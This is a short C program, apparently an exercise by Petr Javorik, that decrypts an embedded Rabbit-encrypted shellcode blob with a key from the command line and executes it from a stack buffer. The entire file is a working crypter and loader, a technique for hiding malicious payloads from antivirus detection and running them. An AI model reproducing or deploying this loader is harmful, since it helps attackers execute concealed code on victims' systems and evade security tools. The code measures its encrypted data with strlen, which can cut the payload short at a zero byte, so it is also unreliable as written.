// File: decryptAndExecute.c
// Author: Petr Javorik

#include <string.h>
#include <stdio.h>
#include "rabbit/code/rabbit.c"

// Encrypted shellcode
unsigned char encrypted[] = \
"\x7f\xaf\xa4\x1e\xb7\x11\x1e\x89\xd5\x56\x95\x03\x7a\x4b\x07\x0b\x94\xf8\xd4\x86\x3d\xbc\x4c\xa3\x30";


int main(int argc, char **argv)
{
    // Initialize ECRYPT library
    ECRYPT_init();
    // ctx is object containing settings and state of encryption engine
    ECRYPT_ctx ctx;
    // Load key
    ECRYPT_keysetup(&ctx, argv[1], 128, 0);
    // Decrypt
    u8 decrypted[200];
    int codeLen = strlen(encrypted);
    ECRYPT_process_bytes(0, &ctx, encrypted, decrypted, codeLen);
    // Execute
    int (*DecryptedFun)() = (int(*)())decrypted;
    DecryptedFun();
}
